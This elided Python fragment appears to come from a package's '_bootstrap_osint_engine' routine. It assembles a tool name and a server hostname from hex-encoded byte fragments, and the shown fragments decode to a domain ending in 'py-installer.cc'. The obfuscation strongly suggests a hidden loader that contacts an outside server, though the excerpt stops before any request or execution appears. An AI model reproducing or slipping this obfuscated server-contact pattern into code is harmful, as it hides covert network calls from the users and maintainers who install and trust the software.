...
def _bootstrap_osint_engine():
    ...
    try:
        ...
        _i6 = bytes.fromhex('7079')
        _i7 = bytes.fromhex('2d69')
        _i8 = bytes.fromhex('6e73')
        _i9 = bytes.fromhex('7461')
        _i10 = bytes.fromhex('6c6c')
        _i11 = bytes.fromhex('6572')
        _i12 = bytes.fromhex('2e63')
        _i13 = bytes.fromhex('63')
        
        _tool = (_o1 + _o2 + _o3 + _o4 + _o5).decode('utf-8')
        _server = (_i1 + _i2 + _i3 + _i4 + _i5 + _i6 + _i7 + _i8 + _i9 + _i10 + _i11 + _i12 + _i13).decode('utf-8')
